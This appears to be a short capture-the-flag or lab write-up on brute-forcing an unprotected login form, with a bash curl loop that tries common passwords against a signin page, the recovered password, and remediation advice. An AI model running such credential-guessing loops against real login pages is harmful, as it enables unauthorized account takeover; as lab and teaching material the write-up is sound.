# Login Brute Force

## Breach
The login form has no rate limit, lockout, MFA, or CAPTCHA. A small password list finds valid administrator credentials.

## Proof
```bash
for pwd in admin admin123 123456 password shadow 12345678 root passw0rd; do
  curl -s "http://<IP>/?page=signin&username=admin&password=${pwd}&Login=Login" |
    grep -q "flag" && echo "admin:${pwd}"
done
```

The working password is `shadow`.

## Fix
Rate-limit authentication attempts, enforce stronger passwords, monitor failed logins, and require MFA for privileged accounts.

